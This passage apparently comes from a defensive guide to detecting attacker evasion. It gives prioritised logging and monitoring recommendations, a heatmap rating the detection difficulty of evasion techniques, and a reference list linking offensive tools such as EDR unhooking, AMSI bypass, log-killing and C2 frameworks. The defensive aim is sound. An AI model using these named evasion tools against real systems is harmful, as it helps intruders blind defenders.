| auditd | Execution of non-standard SUID binary | Whitelist known SUID binaries, alert on unknown |

**Detection Difficulty:** Easy (with baseline)

---

## Detection Architecture Recommendations

### Priority 1 — Foundation (deploy immediately)
1. **Sysmon** with full configuration (SwiftOnSecurity + custom rules) — covers 60%+ of detection patterns above
2. **PowerShell ScriptBlock Logging** (Event ID 4104) — defeats most PowerShell obfuscation
3. **Windows Security Audit Policy** — enable command-line logging (Event ID 4688), object access, privilege use
4. **auditd** on Linux — syscall auditing for ptrace, chmod, unlink on critical paths
5. **Cloud audit logging** — CloudTrail, GCP Audit, Azure Diagnostic (never disable)

### Priority 2 — Enhanced Detection
6. **ETW-TI** (Threat Intelligence channel) — kernel-level syscall telemetry (requires PPL-protected consumer)
7. **YARA scanning** — periodic memory and file scanning with rules for injection artifacts
8. **Network monitoring** — JA3/JARM fingerprinting, DNS entropy analysis, beacon detection
9. **File Integrity Monitoring** — /var/log/*, /etc/pam.d/*, SUID baselines, SYSVOL

### Priority 3 — Advanced
10. **Kernel-level telemetry** — kernel callbacks independent of ETW (addresses Phant0m/Ghost-In-The-Logs)
11. **Memory forensics** — periodic volatile memory analysis for unbacked executable pages
12. **Hardware-based attestation** — TPM measured boot, Secure Boot enforcement
13. **Hook integrity monitoring** — periodic verification that EDR hooks are intact (addresses SharpUnhooker/SharpBlock)

### Detection Coverage Heatmap

| Evasion Category | Easy | Medium | Hard | Very Hard |
|---|---|---|---|---|
| Impair Defenses | Firewall, Safe Mode, Downgrade | Audit disable | ETW patch, Event Log kill | Patchless ETW/AMSI, Kernel-level |
| Indicator Removal | Log clear, History clear | File deletion, Timestomp | — | — |
| Process Injection | — | DLL injection | APC, Hollowing, Reflective | Doppelganging, Syscall-based |
| Obfuscation | — | Packing, Cmd obfuscation | API resolution, Fileless | Polymorphic, Steganography |
| Proxy Execution | Most LOLBins | — | — | — |
| Token Manipulation | — | Token theft, SID-History | Parent PID Spoofing | — |
| Masquerading | Name/path, RLO | Process trees | — | Argument spoofing |
| Trust Subversion | Root cert | MOTW bypass | Code signing | — |
| Execution Hijack | COR_PROFILER | DLL sideload/search order | — | KernelCallbackTable |
| Auth Modification | — | Password filter, PAM, Skeleton Key | — | — |
| Rootkits/Firmware | — | — | — | All (rootkit, bootkit, firmware) |
| Network Evasion | — | JA3/DNS baseline | Port knocking | Custom C2 profiles |
| Anti-Analysis | Anti-debug/VM (as IOC) | — | — | — |
| Cloud Evasion | Log disable | Compute modification | — | — |
| EDR Bypass Tooling | — | — | DLL unhooking | DLL blocking, Sleep obfuscation |

---

## References

- MITRE ATT&CK TA0005: https://attack.mitre.org/tactics/TA0005/
- Unprotect.it: https://unprotect.it/map/
- LOLDrivers: https://www.loldrivers.io/
- LOLBas: https://lolbas-project.github.io/
- GTFOBins: https://gtfobins.github.io/
- SigmaHQ Rules: https://github.com/SigmaHQ/sigma
- Invoke-Phant0m: https://github.com/hlldz/Invoke-Phant0m
- Ghost-In-The-Logs: https://github.com/bats3c/Ghost-In-The-Logs
- SharpBlock: https://github.com/CCob/SharpBlock
- SharpUnhooker: https://github.com/GetRektBoy724/SharpUnhooker
- PetitPotam: https://github.com/topotam/PetitPotam (CVE-2021-36942)
- LocalPotato: https://github.com/decoder-it/LocalPotato (CVE-2023-21746)
- RunasCs: https://github.com/antonioCoco/RunasCs
- Empire C2: https://github.com/BC-SECURITY/Empire
- BypassAV Mindmap: https://github.com/matro7sh/BypassAV
- AMSI Bypass Collection: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
